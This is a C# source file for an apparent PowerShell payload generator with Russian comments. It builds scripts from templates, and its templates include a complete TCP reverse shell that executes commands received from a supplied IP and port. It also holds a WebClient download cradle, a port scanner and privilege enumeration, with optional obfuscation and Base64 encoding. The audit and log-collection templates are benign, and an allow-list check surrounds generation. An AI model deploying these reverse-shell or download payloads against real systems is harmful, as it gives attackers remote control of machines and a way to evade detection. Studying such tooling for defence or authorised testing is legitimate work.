using System;
using System.Text;
using System.Collections.Generic;
using PowerShellPayloadGenerator.Models;
using PowerShellPayloadGenerator.Utilities;

namespace PowerShellPayloadGenerator.Services
{
    public class PayloadService
    {
        private readonly SecurityContext _securityContext;

        public PayloadService()
        {
            _securityContext = new SecurityContext();
        }

        public PayloadService(SecurityContext securityContext)
        {
            _securityContext = securityContext ?? new SecurityContext();
        }

        public GenerationResult GeneratePayload(PayloadConfig config)
        {
            var result = new GenerationResult();
            var startTime = DateTime.UtcNow;
            
            try
            {
                // Проверка безопасности
                if (!_securityContext.IsPayloadTypeAllowed(config.Type))
                {
                    result.Errors.Add($"Тип полезной нагрузки '{config.Type}' запрещен политикой безопасности.");
                    result.Success = false;
                    result.RiskLevel = RiskLevel.High;
                    return result;
                }

                // Проверка IP-адреса
                if (!string.IsNullOrEmpty(config.IpAddress) && !_securityContext.IsIpAllowed(config.IpAddress))
                {
                    result.Errors.Add($"IP-адрес '{config.IpAddress}' запрещен политикой безопасности.");
                    result.Success = false;
                    result.RiskLevel = RiskLevel.High;
                    return result;
                }

                // Проверка команды
                if (!string.IsNullOrEmpty(config.Command) && !_securityContext.IsCommandAllowed(config.Command))
                {
                    result.Errors.Add($"Команда содержит запрещенные паттерны.");
                    result.Success = false;
                    result.RiskLevel = RiskLevel.High;
                    return result;
                }

                // Валидация конфигурации
                ValidateConfig(config);
                
                // Генерация полезной нагрузки
                string payload = config.Type.ToLower() switch
                {
                    "reverseshell" => GenerateReverseShell(config),
                    "download" => GenerateDownloadPayload(config),
                    "command" => GenerateCommandPayload(config),
                    "discovery" => GenerateDiscoveryPayload(config),
                    "privilegeenumeration" => GeneratePrivilegeEnumeration(config),
                    "vulnerabilitycheck" => GenerateVulnerabilityCheck(config),
                    "portscan" => GeneratePortScan(config),
                    "logcollection" => GenerateLogCollection(config),
                    "securityaudit" => GenerateSecurityAudit(config),
                    _ => throw new ArgumentException($"Неизвестный тип полезной нагрузки: {config.Type}")
                };

                // Обфускация (если требуется)
                if (config.Obfuscate)
                {
                    payload = SecurityHelper.ObfuscatePowerShell(payload);
                }

                // Кодирование (если требуется)
                if (config.Encode)
                {
                    payload = SecurityHelper.EncodeBase64(payload);
                }

                // Создание результата
                result.Payload = payload;
                result.Size = Encoding.UTF8.GetByteCount(payload);
                result.Success = true;
                result.RiskLevel = CalculateRiskLevel(config.Type);
                result.Hash = SecurityHelper.CalculateSha256Hash(payload);
                result.Timestamp = DateTime.UtcNow;
                
                // Добавляем метаданные
                result.Metadata.Add("PayloadType", config.Type);
                result.Metadata.Add("GeneratedAt", DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss"));
                result.Metadata.Add("Encoding", config.Encode ? "Base64" : "PlainText");
                result.Metadata.Add("Obfuscation", config.Obfuscate ? "Enabled" : "Disabled");
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Errors.Add(ex.Message);
                result.RiskLevel = RiskLevel.Critical;
            }
            finally
            {
                result.GenerationTimeMs = (long)(DateTime.UtcNow - startTime).TotalMilliseconds;
            }
            
            return result;
        }

        private string GenerateReverseShell(PayloadConfig config)
        {
            return $@"$client = New-Object System.Net.Sockets.TCPClient('{config.IpAddress}',{config.Port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();";
        }

        private string GenerateDownloadPayload(PayloadConfig config)
        {
            string url = string.IsNullOrEmpty(config.IpAddress) ? config.FilePath : config.IpAddress;
            return $@"(New-Object System.Net.WebClient).DownloadFile('{url}', 'downloaded.file');
Write-Host 'File downloaded successfully'";
        }

        private string GenerateCommandPayload(PayloadConfig config)
        {
            return config.Command ?? "Get-Process | Select-Object Name, CPU | Format-Table";
        }

        private string GenerateDiscoveryPayload(PayloadConfig config)
        {
            return @"
# System Information Discovery
Write-Host '=== System Information ===' -ForegroundColor Green
systeminfo | Select-String 'OS Name','OS Version','System Type','Total Physical Memory'

Write-Host '`n=== Network Information ===' -ForegroundColor Green
ipconfig /all | Select-String 'IPv4 Address','Physical Address'

Write-Host '`n=== User Information ===' -ForegroundColor Green
whoami /all

Write-Host '`n=== Running Processes ===' -ForegroundColor Green
Get-Process | Select-Object -First 10 Name, Id, CPU
";
        }

        private string GeneratePrivilegeEnumeration(PayloadConfig config)
        {
            return @"
# Privilege Enumeration Script
Write-Host '=== Current User Privileges ===' -ForegroundColor Yellow
whoami /priv

Write-Host '`n=== Local Users ===' -ForegroundColor Yellow
Get-LocalUser | Format-Table Name, Enabled, Description

Write-Host '`n=== Local Groups ===' -ForegroundColor Yellow
Get-LocalGroup | Format-Table Name, Description

Write-Host '`n=== User in Administrators Group ===' -ForegroundColor Yellow
Get-LocalGroupMember -Group 'Administrators' | Format-Table Name, PrincipalSource
";
        }

        private string GenerateVulnerabilityCheck(PayloadConfig config)
        {
            return @"
# Basic Security Vulnerability Check
Write-Host '=== Windows Updates Status ===' -ForegroundColor Cyan
Get-HotFix | Select-Object -First 5 HotFixID, InstalledOn, Description

Write-Host '`n=== Firewall Status ===' -ForegroundColor Cyan
Get-NetFirewallProfile | Format-Table Name, Enabled

Write-Host '`n=== Antivirus Status ===' -ForegroundColor Cyan
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | 
    Select-Object displayName, productState | Format-Table

Write-Host '`n=== UAC Status ===' -ForegroundColor Cyan
Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA
";
        }

        private string GeneratePortScan(PayloadConfig config)
        {
            string target = config.IpAddress ?? "localhost";
            return $@"
# Basic Port Scanner for {target}
Write-Host 'Scanning common ports on {target}...' -ForegroundColor Magenta

$ports = @(21,22,23,25,53,80,110,135,139,143,443,445,3389,8080,8443)
$results = @()

foreach ($port in $ports) {{
    $tcp = New-Object System.Net.Sockets.TcpClient
    try {{
        $tcp.Connect('{target}', $port)
        $status = 'Open'
        $tcp.Close()
    }} catch {{
        $status = 'Closed'
    }}
    
    $result = [PSCustomObject]@{{ 
        Port = $port
        Status = $status
        Service = (Get-ServiceFromPort $port)
    }}
    $results += $result
}}

$results | Format-Table Port, Status, Service

function Get-ServiceFromPort($port) {{
    $services = @{{
        21 = 'FTP'; 22 = 'SSH'; 23 = 'Telnet'; 25 = 'SMTP'
        53 = 'DNS'; 80 = 'HTTP'; 110 = 'POP3'; 135 = 'MS RPC'
        139 = 'NetBIOS'; 143 = 'IMAP'; 443 = 'HTTPS'; 445 = 'SMB'
        3389 = 'RDP'; 8080 = 'HTTP-Alt'; 8443 = 'HTTPS-Alt'
    }}
    return $services[$port] ?? 'Unknown'
}}
";
        }

        private string GenerateLogCollection(PayloadConfig config)
        {
            return @"
# Security Log Collection
$outputDir = '.\SecurityLogs_' + (Get-Date -Format 'yyyyMMdd_HHmmss')
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

Write-Host 'Collecting security logs...' -ForegroundColor Blue

# Application Logs
Get-EventLog -LogName Application -Newest 100 | 
    Export-Csv -Path (Join-Path $outputDir 'ApplicationLogs.csv') -NoTypeInformation

# System Logs
Get-EventLog -LogName System -Newest 100 | 
    Export-Csv -Path (Join-Path $outputDir 'SystemLogs.csv') -NoTypeInformation

# Security Logs
Get-EventLog -LogName Security -Newest 100 | 
    Export-Csv -Path (Join-Path $outputDir 'SecurityLogs.csv') -NoTypeInformation

Write-Host ""Logs saved to: $outputDir"" -ForegroundColor Green
Get-ChildItem $outputDir | Format-Table Name, Length, LastWriteTime
";
        }

        private string GenerateSecurityAudit(PayloadConfig config)
        {
            return @"
# Security Audit Script
Write-Host '=== SECURITY AUDIT REPORT ===' -ForegroundColor Red -BackgroundColor White
Write-Host 'Generated: ' (Get-Date) -ForegroundColor Yellow
Write-Host '================================' -ForegroundColor Red

# 1. Account Policies
Write-Host '`n1. ACCOUNT POLICIES:' -ForegroundColor Cyan
net accounts

# 2. Password Policy
Write-Host '`n2. PASSWORD POLICY:' -ForegroundColor Cyan
net accounts | Select-String 'password'

# 3. Audit Policy
Write-Host '`n3. AUDIT POLICY:' -ForegroundColor Cyan
auditpol /get /category:*

# 4. Services Configuration
Write-Host '`n4. DANGEROUS SERVICES:' -ForegroundColor Cyan
Get-Service | Where-Object { 
    $_.Name -like '*telnet*' -or 
    $_.Name -like '*ftp*' -or 
    $_.Name -like '*smb*' 
} | Format-Table Name, Status, StartType

# 5. Open Shares
Write-Host '`n5. NETWORK SHARES:' -ForegroundColor Cyan
Get-SmbShare | Format-Table Name, Path, Description

Write-Host '`n=== AUDIT COMPLETE ===' -ForegroundColor Green
";
        }

        private void ValidateConfig(PayloadConfig config)
        {
            if (string.IsNullOrEmpty(config.Type))
                throw new ArgumentException("Тип полезной нагрузки обязателен");

            if (config.Type == "ReverseShell" || config.Type == "Download")
            {
                if (string.IsNullOrEmpty(config.IpAddress))
                    throw new ArgumentException("IP-адрес обязателен для этого типа полезной нагрузки");
                
                if (config.Port <= 0 || config.Port > 65535)
                    throw new ArgumentException("Неверный номер порта");
            }
        }

        private RiskLevel CalculateRiskLevel(string payloadType)
        {
            return payloadType.ToLower() switch
            {
                "reverseshell" => RiskLevel.High,
                "download" => RiskLevel.Medium,
                "portscan" => RiskLevel.Medium,
                "command" => RiskLevel.Low,
                "discovery" => RiskLevel.Info,
                "privilegeenumeration" => RiskLevel.Low,
                "vulnerabilitycheck" => RiskLevel.Info,
                "logcollection" => RiskLevel.Info,
                "securityaudit" => RiskLevel.Info,
                _ => RiskLevel.Info
            };
        }
    }
}
